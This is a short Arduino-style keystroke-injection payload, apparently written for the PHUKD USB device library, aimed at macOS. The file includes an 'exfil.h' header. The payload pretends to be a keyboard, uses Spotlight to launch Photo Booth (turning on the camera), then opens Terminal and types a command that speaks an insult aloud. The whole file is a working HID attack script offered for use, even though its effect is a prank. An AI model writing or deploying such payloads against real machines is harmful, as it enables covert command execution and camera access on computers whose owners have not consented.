#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("photo booth");
  delay(3000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("terminal");
  delay(3000);
  Keyboard.println("Say You look ugly!");
}
